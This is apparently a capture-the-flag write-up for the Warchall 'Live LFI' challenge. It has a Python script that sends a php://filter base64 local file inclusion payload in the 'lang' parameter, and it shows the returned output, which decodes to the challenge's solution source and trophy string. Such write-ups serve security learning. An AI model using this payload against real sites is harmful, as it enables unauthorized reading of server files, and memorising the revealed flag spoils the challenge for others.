================================================================================================================
[wechall] Warchall: Live LFI
================================================================================================================

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4 -> step6 -> step8;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5 -> step7 -> step9;
        }
        step0 -> step1[label="index.php?lang=php://filter/convert.base64-encode/resource=solution.php',true);?>",arrowhead="normal"];
        step3 -> step2[label="@solve",arrowhead="normal"];
    }

|


solve
================================================================================================================


.. code-blcok:: python

    import requests


    url = "http://lfi.warchall.net/index.php"

    params = {
        "lang": "php://filter/convert.base64-encode/resource=solution.php"
    }

    r = requests.get(url, params=params, verify=False)
    print r.content

**return page**

PGh0bWw+Cjxib2R5Pgo8cHJlIHN0eWxlPSJjb2xvcjojMDAwOyI+dGVoIGZhbGcgc2kgbmFlciE8L3ByZT4KPHByZSBzdHlsZT0iY29sb3I6I2ZmZjsiPnRoZSBmbGFnIGlzIG5lYXIhPC9wcmU+CjwvYm9keT4KPC9odG1sPgo8P3BocCAgICAgICAgICAgICAgICAgICMgICBZT1VSX1RST1BIWSAKcmV0dXJuICdTdGVwcGluU3RvbmVzNDJQaWUnOyAjIDwtwrQgPz4K

base64 decode

.. code-block:: html

    <html>
    <body>
    <pre style="color:#000;">teh falg si naer!</pre>
    <pre style="color:#fff;">the flag is near!</pre>
    </body>
    </html>
    <?php                  #   YOUR_TROPHY 
    return 'SteppinStones42Pie'; # <-?? ?>
